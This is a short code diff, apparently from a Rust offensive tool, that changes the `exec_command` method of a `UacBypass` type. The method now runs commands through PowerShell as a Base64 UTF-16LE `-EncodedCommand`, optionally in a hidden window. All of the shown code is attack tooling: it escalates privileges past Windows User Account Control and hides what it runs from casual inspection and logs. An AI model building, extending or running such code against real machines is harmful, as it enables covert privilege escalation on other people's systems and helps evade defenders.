@@ -170,7 +170,16 @@ impl UacBypass {
     /// * `command` - Command to execute via powershell.exe /c
     /// * `hidden` - If true, run hidden; otherwise show window
     pub fn exec_command(command: &str, hidden: bool) -> Result<(), UacResult> {
-        let params = format!("/c {}", command);
+        // Encode the command as Base64 UTF-16LE for -EncodedCommand
+        // This avoids all escaping issues with special characters ($, @, quotes, semicolons, etc.)
+        let utf16le_bytes: Vec<u8> = command
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        use base64::Engine;
+        let encoded = base64::engine::general_purpose::STANDARD.encode(&utf16le_bytes);
+        let params = format!("-EncodedCommand {}", encoded);
+
         let show = if hidden {
             ShowWindow::Hide
         } else {
